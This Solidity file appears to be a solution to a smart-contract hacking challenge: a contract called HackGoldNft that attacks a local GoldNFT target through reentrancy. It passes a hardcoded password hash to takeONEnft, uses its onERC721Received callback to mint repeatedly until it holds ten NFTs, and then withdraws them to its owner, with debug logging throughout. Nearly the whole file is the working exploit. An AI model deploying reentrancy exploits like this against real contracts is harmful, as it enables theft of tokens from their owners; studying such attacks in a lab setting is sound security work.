// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GoldNFT.sol";
import "forge-std/console.sol";
import "forge-std/console2.sol";
interface IERC721Receiver {
    /**
     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
     * by `operator` from `from`, this function is called.
     *
     * It must return its Solidity selector to confirm the token transfer.
     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
     *
     * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
     */
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

contract HackGoldNft {

    address immutable I_PASS_MANAGER = 0xe43029d90B47Dd47611BAd91f24F87Bc9a03AEC2;
    bytes32 immutable PASS = 0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe;
    GoldNFT public nft;
    address public owner;

    constructor(address _goldNFT){
        console.log("constructor checkpoint");
        owner = msg.sender;
        nft = GoldNFT(_goldNFT);
    }

    modifier isOwner() {
        // msg.sender: predefined variable that represents address of the account that called the current function
        require(msg.sender == owner, "Not the Owner");
        _;
    }

    function initializeReent()external isOwner{
        console.log("init checkpoint");
        nft.takeONEnft(PASS);
    }
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4){
        console.log("onERCRECEIVED checkpoint");
        console.log(tokenId);
        uint256 balance = nft.balanceOf(address(this));
        if (balance < 11){
            nft.takeONEnft(PASS);
        }
        return IERC721Receiver.onERC721Received.selector;
    }



    function withdrawNFTs() external isOwner{
        console.log('withdrawNFTs checkmark');
        for(uint i=1;i<11;i++){
            console.log(i);
            nft.transferFrom(address(this), msg.sender, i);      
        }
    }


}